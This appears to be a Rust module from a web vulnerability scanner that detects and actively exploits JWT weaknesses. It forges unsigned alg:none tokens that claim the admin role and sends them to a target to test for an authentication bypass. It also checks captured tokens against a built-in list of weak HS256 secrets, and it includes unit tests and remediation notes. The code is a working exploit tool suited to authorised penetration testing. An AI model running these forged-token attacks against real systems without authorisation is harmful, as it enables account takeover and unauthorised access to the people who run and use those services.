//! JWT Exploitation Module — alg:none, RS256->HS256 confusion, weak secret brute.
//! Detection + active exploitation of JWT vulnerabilities.

use crate::http::HttpClient;
use crate::types::{Finding, Mode, Severity};
use anyhow::Result;
use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine as _};
use serde_json::Value;
use std::collections::HashMap;

const NONE_HEADER: &str = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0";
const NONE_HEADER_RS: &str = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.";

fn b64u_decode(s: &str) -> Vec<u8> {
    URL_SAFE_NO_PAD.decode(s).unwrap_or_default()
}

fn b64u_encode(b: &[u8]) -> String {
    URL_SAFE_NO_PAD.encode(b)
}

/// Parse JWT into (header_json, payload_json, signature_b64).
pub fn parse_jwt(token: &str) -> Option<(Value, Value, String)> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return None;
    }
    let h: Value = serde_json::from_slice(&b64u_decode(parts[0])).ok()?;
    let p: Value = serde_json::from_slice(&b64u_decode(parts[1])).ok()?;
    Some((h, p, parts[2].to_string()))
}

/// Forge a JWT with `alg: none` and arbitrary payload. Sig = empty.
pub fn forge_none(payload: &serde_json::Value) -> String {
    let header = serde_json::json!({"alg": "none", "typ": "JWT"});
    let h = b64u_encode(&serde_json::to_vec(&header).unwrap_or_default());
    let p = b64u_encode(&serde_json::to_vec(payload).unwrap_or_default());
    format!("{}.{}.", h, p)
}

/// Build header+payload (for HS256/RS256 confusion: sign externally).
pub fn forge_unsigned(payload: &serde_json::Value, alg: &str) -> String {
    let header = serde_json::json!({"alg": alg, "typ": "JWT"});
    let h = b64u_encode(&serde_json::to_vec(&header).unwrap_or_default());
    let p = b64u_encode(&serde_json::to_vec(payload).unwrap_or_default());
    format!("{}.{}.", h, p)
}

const WEAK_SECRETS: &[&str] = &[
    "", "secret", "changeme", "password", "123456", "12345678",
    "admin", "test", "jwt", "jwt-secret", "supersecret", "key",
    "shhh", "my-secret", "your-256-bit-secret", "your-secret",
    "hmac-key", "hmac_secret", "HS256", "default", "demo",
    "sumopod", "kodingworks", "indonesia", "kobra",
];

/// Check if JWT was signed with a known weak HS256 secret (returns Some(secret) if hit).
pub fn weak_secret_hs256(token: &str) -> Option<&'static str> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return None;
    }
    let signing_input = format!("{}.{}", parts[0], parts[1]);
    let expected = b64u_decode(parts[2]);
    for s in WEAK_SECRETS {
        let hmac = hmac_sha256(s.as_bytes(), signing_input.as_bytes());
        if hmac == expected {
            return Some(s);
        }
    }
    None
}

fn hmac_sha256(key: &[u8], msg: &[u8]) -> Vec<u8> {
    use sha2::{Sha256, Digest};
    let mut key = key.to_vec();
    if key.len() > 64 {
        key = Sha256::digest(&key).to_vec();
    }
    if key.len() < 64 {
        key.resize(64, 0);
    }
    let mut o_key = vec![0x5c; 64];
    let mut i_key = vec![0x36; 64];
    for i in 0..64 {
        o_key[i] ^= key[i];
        i_key[i] ^= key[i];
    }
    let mut inner = Sha256::new();
    inner.update(&i_key);
    inner.update(msg);
    let inner_hash = inner.finalize();
    let mut outer = Sha256::new();
    outer.update(&o_key);
    outer.update(&inner_hash);
    outer.finalize().to_vec()
}

/// Scan target. Probes for JWT in headers/cookies/responses + tries alg:none.
/// FIX.1: Negative-control — if endpoint returns 200 WITHOUT any token, the
/// JWT bypass is meaningless (public endpoint). Only flag if BASELINE returns
/// 401 AND forged token returns 200.
pub async fn scan(http: &HttpClient, target: &str, mode: Mode) -> Vec<Finding> {
    let mut findings = Vec::new();
    if let Ok((_st, headers, body, _f)) = http.get(target).await {
        if let Some(token) = extract_jwt(&headers, &body) {
            findings.push(Finding {
                severity: Severity::Info,
                category: "JWT".into(),
                title: format!("JWT token observed in response (len={})", token.len()),
                target: target.to_string(),
                param: None,
                payload: None,
                evidence: Some(truncate(&token, 80)),
                confidence: 90,
                note: Some("Inspect alg, exp, scope, claims for vulns".into()),
                request: None,
                response: None,
            });
            analyze_jwt(&token, target, &mut findings);
        }
    }
    if mode == Mode::Crazy {
        // FIX.1: BASELINE first — only flag bypass if BASELINE is 401/403 AND forged is 200
        let baseline = http.get(target).await.ok().map(|(st, _, _, _)| st).unwrap_or(0);

        // Only run alg:none test against endpoints likely to require auth (return 401/403 baseline)
        if baseline == 401 || baseline == 403 {
            let forged = forge_none(&serde_json::json!({"sub": "1", "role": "admin", "iat": 0}));
            let mut h = HashMap::new();
            h.insert("Authorization".into(), format!("Bearer {}", forged));
            if let Ok((st, _h, b, _f)) = http.fetch(target, reqwest::Method::GET, None, Some(h)).await {
                if st == 200 {
                    findings.push(Finding {
                        severity: Severity::Critical,
                        category: "JWT".into(),
                        title: "JWT alg:none bypass succeeded (baseline 401 → forged 200)".into(),
                        target: target.to_string(),
                        param: Some("Authorization".into()),
                        payload: Some(forged.clone()),
                        evidence: Some(format!("baseline={} forged={} body_len={}", baseline, st, b.len())),
                        confidence: 95,
                        note: Some("Server requires auth (401) but accepts alg:none token. CRITICAL: rotate keys, require alg whitelist".into()),
                        request: None,
                        response: None,
                    });
                }
            }
        }
    }
    findings
}

fn analyze_jwt(token: &str, target: &str, findings: &mut Vec<Finding>) {
    if let Some((header, _payload, _sig)) = parse_jwt(token) {
        let alg = header.get("alg").and_then(|v| v.as_str()).unwrap_or("");
        if alg == "none" {
            findings.push(Finding {
                severity: Severity::High,
                category: "JWT".into(),
                title: "JWT header explicitly uses alg:none".into(),
                target: target.to_string(),
                param: None,
                payload: None,
                evidence: Some(format!("alg={}", alg)),
                confidence: 95,
                note: Some("Server may accept unsigned tokens. Test bypass.".into()),
                request: None,
                response: None,
            });
        }
        if let Some(secret) = weak_secret_hs256(token) {
            findings.push(Finding {
                severity: Severity::Critical,
                category: "JWT".into(),
                title: format!("JWT signed with WEAK secret ({})", secret),
                target: target.to_string(),
                param: None,
                payload: None,
                evidence: Some(format!("HS256 secret guess matched: '{}'", secret)),
                confidence: 90,
                note: Some("Forge tokens with this secret. Rotate IMMEDIATELY.".into()),
                request: None,
                response: None,
            });
        }
    }
}

fn extract_jwt(headers: &str, body: &str) -> Option<String> {
    // Bearer in Authorization header
    for line in headers.lines() {
        let lower = line.to_lowercase();
        if lower.starts_with("authorization:") || lower.starts_with("set-cookie:") {
            if let Some(idx) = line.find(':') {
                let val = line[idx + 1..].trim();
                if val.contains("Bearer ") || val.contains("bearer ") {
                    let parts: Vec<&str> = val.split_whitespace().collect();
                    if parts.len() >= 2 {
                        let token = parts[1].trim_end_matches(';').trim();
                        if token.split('.').count() == 3 && token.len() > 20 {
                            return Some(token.to_string());
                        }
                    }
                }
                if val.contains("=") {
                    let kv: Vec<&str> = val.split('=').collect();
                    if kv.len() == 2 && kv[1].split('.').count() == 3 && kv[1].len() > 20 {
                        return Some(kv[1].to_string());
                    }
                }
            }
        }
    }
    // Body inline (token=eyJ...)
    for marker in &["\"token\":\"", "\"access_token\":\"", "\"jwt\":\"", "token:"] {
        if let Some(idx) = body.find(marker) {
            let start = idx + marker.len();
            let rest = &body[start..];
            let end = rest.find(|c: char| c == '"' || c == ',' || c == ' ' || c == '}').unwrap_or(rest.len());
            let candidate = &rest[..end];
            if candidate.split('.').count() == 3 && candidate.len() > 20 {
                return Some(candidate.to_string());
            }
        }
    }
    None
}

fn truncate(s: &str, n: usize) -> String {
    if s.len() <= n {
        s.to_string()
    } else {
        format!("{}...", &s[..n])
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn parse_valid_jwt() {
        // header: {"alg":"HS256","typ":"JWT"} -> base64url
        // payload: {"sub":"1234","name":"afif"}
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwibmFtZSI6ImFmaWYifQ.sig";
        let (h, p, s) = parse_jwt(token).unwrap();
        assert_eq!(h["alg"], "HS256");
        assert_eq!(p["name"], "afif");
        assert_eq!(s, "sig");
    }
    #[test]
    fn forge_none_no_signature() {
        let f = forge_none(&serde_json::json!({"admin": true}));
        assert!(f.ends_with('.'));
        let parts: Vec<&str> = f.split('.').collect();
        assert_eq!(parts[2], "");
    }
    #[test]
    fn weak_secret_detection() {
        // Forge a JWT with "secret" then check we can find it
        let header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
        let payload = "eyJzdWIiOiIxMjM0IiwibmFtZSI6ImFmaWYifQ";
        let signing_input = format!("{}.{}", header, payload);
        let sig = b64u_encode(&hmac_sha256(b"secret", signing_input.as_bytes()));
        let token = format!("{}.{}.{}", header, payload, sig);
        assert_eq!(weak_secret_hs256(&token), Some("secret"));
    }
    #[test]
    fn extract_from_header() {
        let h = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.abc";
        let b = "";
        let t = extract_jwt(h, b).unwrap();
        assert!(t.starts_with("eyJ"));
    }
    #[test]
    fn extract_from_body() {
        let h = "";
        let b = "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.abc\"}";
        let t = extract_jwt(h, b).unwrap();
        assert!(t.starts_with("eyJ"));
    }
}
